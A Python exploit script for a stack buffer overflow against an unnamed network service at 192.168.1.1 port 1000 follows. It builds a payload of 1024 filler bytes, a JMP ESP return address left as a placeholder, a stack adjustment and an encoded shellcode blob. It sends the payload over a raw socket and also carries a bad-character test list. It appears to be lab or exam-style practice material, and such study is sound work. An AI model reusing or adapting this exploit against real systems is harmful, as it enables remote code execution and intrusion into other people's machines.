#!/usr/bin/env python

import struct
import socket


host = "192.168.1.1"
port = 1000
ptr_jump_esp = 0x00000000 # Point to JMP ESP. Find this with !mona -s '\xff\xe4'

badchars = ""
badchars += "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14"
badchars += "\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28"
badchars += "\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c"
badchars += "\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
badchars += "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64"
badchars += "\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78"
badchars += "\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c"
badchars += "\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
badchars += "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4"
badchars += "\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8"
badchars += "\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc"
badchars += "\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
badchars += "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"


buf = ""

buf += "A" * 1024 #Intial overflow

buf += struct.pack("<I", ptr_jump_esp) # Formatting memory address for Little Endian (x86)

buf += "\x83\xec\x10" # Move ESP to up a bit in the stack to prevent shigata_na_gai from breaking it

buf += "\xba\x9d\xca\xb6\x7c\xda\xcb\xd9\x74\x24\xf4\x58\x29" # Begin Shellcode
buf += "\xc9\xb1\x52\x31\x50\x12\x83\xc0\x04\x03\xcd\xc4\x54"
buf += "\x89\x11\x30\x1a\x72\xe9\xc1\x7b\xfa\x0c\xf0\xbb\x98"
buf += "\x45\xa3\x0b\xea\x0b\x48\xe7\xbe\xbf\xdb\x85\x16\xb0"
buf += "\x6c\x23\x41\xff\x6d\x18\xb1\x9e\xed\x63\xe6\x40\xcf"
buf += "\xab\xfb\x81\x08\xd1\xf6\xd3\xc1\x9d\xa5\xc3\x66\xeb"
buf += "\x75\x68\x34\xfd\xfd\x8d\x8d\xfc\x2c\x00\x85\xa6\xee"
buf += "\xa3\x4a\xd3\xa6\xbb\x8f\xde\x71\x30\x7b\x94\x83\x90"
buf += "\xb5\x55\x2f\xdd\x79\xa4\x31\x1a\xbd\x57\x44\x52\xbd"
buf += "\xea\x5f\xa1\xbf\x30\xd5\x31\x67\xb2\x4d\x9d\x99\x17"
buf += "\x0b\x56\x95\xdc\x5f\x30\xba\xe3\x8c\x4b\xc6\x68\x33"
buf += "\x9b\x4e\x2a\x10\x3f\x0a\xe8\x39\x66\xf6\x5f\x45\x78"
buf += "\x59\x3f\xe3\xf3\x74\x54\x9e\x5e\x11\x99\x93\x60\xe1"
buf += "\xb5\xa4\x13\xd3\x1a\x1f\xbb\x5f\xd2\xb9\x3c\x9f\xc9"
buf += "\x7e\xd2\x5e\xf2\x7e\xfb\xa4\xa6\x2e\x93\x0d\xc7\xa4"
buf += "\x63\xb1\x12\x6a\x33\x1d\xcd\xcb\xe3\xdd\xbd\xa3\xe9"
buf += "\xd1\xe2\xd4\x12\x38\x8b\x7f\xe9\xab\x74\xd7\xc9\x42"
buf += "\x1d\x2a\x29\x84\x81\xa3\xcf\xcc\x29\xe2\x58\x79\xd3"
buf += "\xaf\x12\x18\x1c\x7a\x5f\x1a\x96\x89\xa0\xd5\x5f\xe7"
buf += "\xb2\x82\xaf\xb2\xe8\x05\xaf\x68\x84\xca\x22\xf7\x54"
buf += "\x84\x5e\xa0\x03\xc1\x91\xb9\xc1\xff\x88\x13\xf7\xfd"
buf += "\x4d\x5b\xb3\xd9\xad\x62\x3a\xaf\x8a\x40\x2c\x69\x12"
buf += "\xcd\x18\x25\x45\x9b\xf6\x83\x3f\x6d\xa0\x5d\x93\x27"
buf += "\x24\x1b\xdf\xf7\x32\x24\x0a\x8e\xda\x95\xe3\xd7\xe5"
buf += "\x1a\x64\xd0\x9e\x46\x14\x1f\x75\xc3\x24\x6a\xd7\x62"
buf += "\xad\x33\x82\x36\xb0\xc3\x79\x74\xcd\x47\x8b\x05\x2a"
buf += "\x57\xfe\x00\x76\xdf\x13\x79\xe7\x8a\x13\x2e\x08\x9f" # End Shellcode

buf += "\n" #send newline

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #create socket
s.connect((host, port)) #connect to host
s.send(buf) #send buffer
s.close() #close cxn.
